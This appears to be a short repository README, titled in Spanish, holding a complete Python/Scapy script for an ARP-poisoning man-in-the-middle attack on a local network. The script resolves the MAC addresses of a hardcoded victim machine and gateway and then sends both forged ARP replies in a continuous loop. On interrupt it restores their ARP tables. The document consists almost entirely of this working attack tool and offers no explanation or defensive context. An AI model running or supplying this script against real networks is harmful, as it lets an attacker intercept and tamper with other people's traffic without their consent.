# Ataque-MITM-ARP
Ataque MITM mediante el protocolo ARP 

#!/usr/bin/env python3
from scapy.all import *
import time
import os

INTERFACE = "ens33"
IP_VICTIMA = "192.168.13.10"
IP_GATEWAY = "192.168.13.60"

def get_mac(ip):
    conf.verb = 0
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=INTERFACE, inter=0.1)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def envenenar(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restaurar(target_ip, source_ip, target_mac, source_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

try:
    print("[*] Localizando MACs en la red...")
    mac_victima = get_mac(IP_VICTIMA)
    mac_gateway = get_mac(IP_GATEWAY)

    if not mac_victima or not mac_gateway:
        print("[!] Error: No se pudo obtener las direcciones MAC.")
        exit()

    print(f"[+] Windows en {mac_victima}")
    print(f"[+] Router en {mac_gateway}")
    print("[*] Iniciando MitM...")

    while True:
        envenenar(IP_VICTIMA, IP_GATEWAY, mac_victima)
        envenenar(IP_GATEWAY, IP_VICTIMA, mac_gateway)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Restaurando tablas ARP...")
    restaurar(IP_VICTIMA, IP_GATEWAY, mac_victima, mac_gateway)
    restaurar(IP_GATEWAY, IP_VICTIMA, mac_gateway, mac_victima)
    print("[+] Hecho.")
